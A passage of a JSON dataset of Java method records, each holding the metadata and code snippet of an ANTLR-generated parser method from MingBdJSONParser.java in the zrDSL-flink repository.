["ParseTreeListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void exitRule(ParseTreeListener listener) {\n\t\t\tif ( listener instanceof MingBdJSONListener ) ((MingBdJSONListener)listener).exitLoad(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56067, "method_name": "accept", "class_name": "LoadContext", "params": ["ParseTreeVisitor<T>"], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "\t\tpublic <T> T accept(ParseTreeVisitor<? extends T> visitor) {\n\t\t\tif ( visitor instanceof MingBdJSONVisitor ) return ((MingBdJSONVisitor<? extends T>)visitor).visitLoad(this);\n\t\t\telse return visitor.visitChildren(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56068, "method_name": "joinpair", "class_name": "JoinContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<JoinpairContext>", "snippet": "\t\tpublic List<JoinpairContext> joinpair() {\n\t\t\treturn getRuleContexts(JoinpairContext.class);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56069, "method_name": "joinpair", "class_name": "JoinContext", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "JoinpairContext", "snippet": "\t\tpublic JoinpairContext joinpair(int i) {\n\t\t\treturn getRuleContext(JoinpairContext.class,i);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56070, "method_name": "getRuleIndex", "class_name": "JoinContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\t\t@Override public int getRuleIndex() { return RULE_join; }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56071, "method_name": "enterRule", "class_name": "JoinContext", "params": ["ParseTreeListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void enterRule(ParseTreeListener listener) {\n\t\t\tif ( listener instanceof MingBdJSONListener ) ((MingBdJSONListener)listener).enterJoin(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56072, "method_name": "exitRule", "class_name": "JoinContext", "params": ["ParseTreeListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void exitRule(ParseTreeListener listener) {\n\t\t\tif ( listener instanceof MingBdJSONListener ) ((MingBdJSONListener)listener).exitJoin(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56073, "method_name": "accept", "class_name": "JoinContext", "params": ["ParseTreeVisitor<T>"], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "\t\tpublic <T> T accept(ParseTreeVisitor<? extends T> visitor) {\n\t\t\tif ( visitor instanceof MingBdJSONVisitor ) return ((MingBdJSONVisitor<? extends T>)visitor).visitJoin(this);\n\t\t\telse return visitor.visitChildren(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56074, "method_name": "transinfo", "class_name": "TransContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<TransinfoContext>", "snippet": "\t\tpublic List<TransinfoContext> transinfo() {\n\t\t\treturn getRuleContexts(TransinfoContext.class);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56075, "method_name": "transinfo", "class_name": "TransContext", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "TransinfoContext", "snippet": "\t\tpublic TransinfoContext transinfo(int i) {\n\t\t\treturn getRuleContext(TransinfoContext.class,i);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56076, "method_name": "getRuleIndex", "class_name": "TransContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\t\t@Override public int getRuleIndex() { return RULE_trans; }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56077, "method_name": "enterRule", "class_name": "TransContext", "params": ["ParseTreeListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void enterRule(ParseTreeListener listener) {\n\t\t\tif ( listener instanceof MingBdJSONListener ) ((MingBdJSONListener)listener).enterTrans(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56078, "method_name": "exitRule", "class_name": "TransContext", "params": ["ParseTreeListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void exitRule(ParseTreeListener listener) {\n\t\t\tif ( listener instanceof MingBdJSONListener ) ((MingBdJSONListener)listener).exitTrans(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56079, "method_name": "accept", "class_name": "TransContext", "params": ["ParseTreeVisitor<T>"], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "\t\tpublic <T> T accept(ParseTreeVisitor<? extends T> visitor) {\n\t\t\tif ( visitor instanceof MingBdJSONVisitor ) return ((MingBdJSONVisitor<? extends T>)visitor).visitTrans(this);\n\t\t\telse return visitor.visitChildren(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56080, "method_name": "kafkaSource", "class_name": "DataSourceContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "KafkaSourceContext", "snippet": "\t\tpublic KafkaSourceContext kafkaSource() {\n\t\t\treturn getRuleContext(KafkaSourceContext.class,0);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56081, "method_name": "mysqlSource", "class_name": "DataSourceContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "MysqlSourceContext", "snippet": "\t\tpublic MysqlSourceContext mysqlSource() {\n\t\t\treturn getRuleContext(MysqlSourceContext.class,0);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56082, "method_name": "getRuleIndex", "class_name": "DataSourceContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\t\t@Override public int getRuleIndex() { return RULE_dataSource; }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56083, "method_name": "enterRule", "class_name": "DataSourceContext", "params": ["ParseTreeListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void enterRule(ParseTreeListener listener) {\n\t\t\tif ( listener instanceof MingBdJSONListener ) ((MingBdJSONListener)listener).enterDataSource(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56084, "method_name": "exitRule", "class_name": "DataSourceContext", "params": ["ParseTreeListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void exitRule(ParseTreeListener listener) {\n\t\t\tif ( listener instanceof MingBdJSONListener ) ((MingBdJSONListener)listener).exitDataSource(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56085, "method_name": "accept", "class_name": "DataSourceContext", "params": ["ParseTreeVisitor<T>"], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "\t\tpublic <T> T accept(ParseTreeVisitor<? extends T> visitor) {\n\t\t\tif ( visitor instanceof MingBdJSONVisitor ) return ((MingBdJSONVisitor<? extends T>)visitor).visitDataSource(this);\n\t\t\telse return visitor.visitChildren(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56086, "method_name": "getRuleIndex", "class_name": "MysqlSourceContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\t\t@Override public int getRuleIndex() { return RULE_mysqlSource; }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56087, "method_name": "enterRule", "class_name": "MysqlSourceContext", "params": ["ParseTreeListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void enterRule(ParseTreeListener listener) {\n\t\t\tif ( listener instanceof MingBdJSONListener ) ((MingBdJSONListener)listener).enterMysqlSource(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56088, "method_name": "exitRule", "class_name": "MysqlSourceContext", "params": ["ParseTreeListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void exitRule(ParseTreeListener listener) {\n\t\t\tif ( listener instanceof MingBdJSONListener ) ((MingBdJSONListener)listener).exitMysqlSource(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56089, "method_name": "accept", "class_name": "MysqlSourceContext", "params": ["ParseTreeVisitor<T>"], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "\t\tpublic <T> T accept(ParseTreeVisitor<? extends T> visitor) {\n\t\t\tif ( visitor instanceof MingBdJSONVisitor ) return ((MingBdJSONVisitor<? extends T>)visitor).visitMysqlSource(this);\n\t\t\telse return visitor.visitChildren(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56090, "method_name": "select", "class_name": "TransinfoContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "SelectContext", "snippet": "\t\tpublic SelectContext select() {\n\t\t\treturn getRuleContext(SelectContext.class,0);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56091, "method_name": "filter", "class_name": "TransinfoContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "FilterContext", "snippet": "\t\tpublic FilterContext filter() {\n\t\t\treturn getRuleContext(FilterContext.class,0);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56092, "method_name": "getRuleIndex", "class_name": "TransinfoContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\t\t@Override public int getRuleIndex() { return RULE_transinfo; }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56093, "method_name": "enterRule", "class_name": "TransinfoContext", "params": ["ParseTreeListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void enterRule(ParseTreeListener listener) {\n\t\t\tif ( listener instanceof MingBdJSONListener ) ((MingBdJSONListener)listener).enterTransinfo(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56094, "method_name": "exitRule", "class_name": "TransinfoContext", "params": ["ParseTreeListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void exitRule(ParseTreeListener listener) {\n\t\t\tif ( listener instanceof MingBdJSONListener ) ((MingBdJSONListener)listener).exitTransinfo(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56095, "method_name": "accept", "class_name": "TransinfoContext", "params": ["ParseTreeVisitor<T>"], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "\t\tpublic <T> T accept(ParseTreeVisitor<? extends T> visitor) {\n\t\t\tif ( visitor instanceof MingBdJSONVisitor ) return ((MingBdJSONVisitor<? extends T>)visitor).visitTransinfo(this);\n\t\t\telse return visitor.visitChildren(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56096, "method_name": "cols", "class_name": "SelectContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ColsContext", "snippet": "\t\tpublic ColsContext cols() {\n\t\t\treturn getRuleContext(ColsContext.class,0);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56097, "method_name": "STRING", "class_name": "SelectContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<TerminalNode>", "snippet": "\t\tpublic List<TerminalNode> STRING() { return getTokens(MingBdJSONParser.STRING); }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56098, "method_name": "STRING", "class_name": "SelectContext", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "TerminalNode", "snippet": "\t\tpublic TerminalNode STRING(int i) {\n\t\t\treturn getToken(MingBdJSONParser.STRING, i);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56099, "method_name": "getRuleIndex", "class_name": "SelectContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\t\t@Override public int getRuleIndex() { return RULE_select; }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56100, "method_name": "enterRule", "class_name": "SelectContext", "params": ["ParseTreeListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void enterRule(ParseTreeListener listener) {\n\t\t\tif ( listener instanceof MingBdJSONListener ) ((MingBdJSONListener)listener).enterSelect(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56101, "method_name": "exitRule", "class_name": "SelectContext", "params": ["ParseTreeListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void exitRule(ParseTreeListener listener) {\n\t\t\tif ( listener instanceof MingBdJSONListener ) ((MingBdJSONListener)listener).exitSelect(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56102, "method_name": "accept", "class_name": "SelectContext", "params": ["ParseTreeVisitor<T>"], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "\t\tpublic <T> T accept(ParseTreeVisitor<? extends T> visitor) {\n\t\t\tif ( visitor instanceof MingBdJSONVisitor ) return ((MingBdJSONVisitor<? extends T>)visitor).visitSelect(this);\n\t\t\telse return visitor.visitChildren(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56103, "method_name": "col", "class_name": "ColsContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<ColContext>", "snippet": "\t\tpublic List<ColContext> col() {\n\t\t\treturn getRuleContexts(ColContext.class);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56104, "method_name": "col", "class_name": "ColsContext", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "ColContext", "snippet": "\t\tpublic ColContext col(int i) {\n\t\t\treturn getRuleContext(ColContext.class,i);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56105, "method_name": "getRuleIndex", "class_name": "ColsContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\t\t@Override public int getRuleIndex() { return RULE_cols; }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56106, "method_name": "enterRule", "class_name": "ColsContext", "params": ["ParseTreeListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void enterRule(ParseTreeListener listener) {\n\t\t\tif ( listener instanceof MingBdJSONListener ) ((MingBdJSONListener)listener).enterCols(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56107, "method_name": "exitRule", "class_name": "ColsContext", "params": ["ParseTreeListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void exitRule(ParseTreeListener listener) {\n\t\t\tif ( listener instanceof MingBdJSONListener ) ((MingBdJSONListener)listener).exitCols(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56108, "method_name": "accept", "class_name": "ColsContext", "params": ["ParseTreeVisitor<T>"], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "\t\tpublic <T> T accept(ParseTreeVisitor<? extends T> visitor) {\n\t\t\tif ( visitor instanceof MingBdJSONVisitor ) return ((MingBdJSONVisitor<? extends T>)visitor).visitCols(this);\n\t\t\telse return visitor.visitChildren(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56109, "method_name": "STRING", "class_name": "ColContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<TerminalNode>", "snippet": "\t\tpublic List<TerminalNode> STRING() { return getTokens(MingBdJSONParser.STRING); }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56110, "method_name": "STRING", "class_name": "ColContext", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "TerminalNode", "snippet": "\t\tpublic TerminalNode STRING(int i) {\n\t\t\treturn getToken(MingBdJSONParser.STRING, i);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56111, "method_name": "getRuleIndex", "class_name": "ColContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\t\t@Override public int getRuleIndex() { return RULE_col; }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56112, "method_name": "enterRule", "class_name": "ColContext", "params": ["ParseTreeListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void enterRule(ParseTreeListener listener) {\n\t\t\tif ( listener instanceof MingBdJSONListener ) ((MingBdJSONListener)listener).enterCol(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56113, "method_name": "exitRule", "class_name": "ColContext", "params": ["ParseTreeListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void exitRule(ParseTreeListener listener) {\n\t\t\tif ( listener instanceof MingBdJSONListener ) ((MingBdJSONListener)listener).exitCol(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56114, "method_name": "accept", "class_name": "ColContext", "params": ["ParseTreeVisitor<T>"], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "\t\tpublic <T> T accept(ParseTreeVisitor<? extends T> visitor) {\n\t\t\tif ( visitor instanceof MingBdJSONVisitor ) return ((MingBdJSONVisitor<? extends T>)visitor).visitCol(this);\n\t\t\telse return visitor.visitChildren(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56115, "method_name": "STRING", "class_name": "FilterContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<TerminalNode>", "snippet": "\t\tpublic List<TerminalNode> STRING() { return getTokens(MingBdJSONParser.STRING); }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56116, "method_name": "STRING", "class_name": "FilterContext", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "TerminalNode", "snippet": "\t\tpublic TerminalNode STRING(int i) {\n\t\t\treturn getToken(MingBdJSONParser.STRING, i);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56117, "method_name": "getRuleIndex", "class_name": "FilterContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\t\t@Override public int getRuleIndex() { return RULE_filter; }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56118, "method_name": "enterRule", "class_name": "FilterContext", "params": ["ParseTreeListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void enterRule(ParseTreeListener listener) {\n\t\t\tif ( listener instanceof MingBdJSONListener ) ((MingBdJSONListener)listener).enterFilter(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56119, "method_name": "exitRule", "class_name": "FilterContext", "params": ["ParseTreeListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void exitRule(ParseTreeListener listener) {\n\t\t\tif ( listener instanceof MingBdJSONListener ) ((MingBdJSONListener)listener).exitFilter(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56120, "method_name": "accept", "class_name": "FilterContext", "params": ["ParseTreeVisitor<T>"], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "\t\tpublic <T> T accept(ParseTreeVisitor<? extends T> visitor) {\n\t\t\tif ( visitor instanceof MingBdJSONVisitor ) return ((MingBdJSONVisitor<? extends T>)visitor).visitFilter(this);\n\t\t\telse return visitor.visitChildren(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56121, "method_name": "saveInfo", "class_name": "SaveContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<SaveInfoContext>", "snippet": "\t\tpublic List<SaveInfoContext> saveInfo() {\n\t\t\treturn getRuleContexts(SaveInfoContext.class);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56122, "method_name": "saveInfo", "class_name": "SaveContext", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "SaveInfoContext", "snippet": "\t\tpublic SaveInfoContext saveInfo(int i) {\n\t\t\treturn getRuleContext(SaveInfoContext.class,i);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56123, "method_name": "getRuleIndex", "class_name": "SaveContext", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\t\t@Override public int getRuleIndex() { return RULE_save; }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", "static"]}}, {"id": 56124, "method_name": "enterRule", "class_name": "SaveContext", "params": ["ParseTreeListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void enterRule(ParseTreeListener listener) {\n\t\t\tif ( listener instanceof MingBdJSONListener ) ((MingBdJSONListener)listener).enterSave(this);\n\t\t}", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/main/java/parse/MingBdJSONParser.java", "stars": "9", "class_props": {"extends": "ParserRuleContext", "implements": null, "modifiers": ["public", 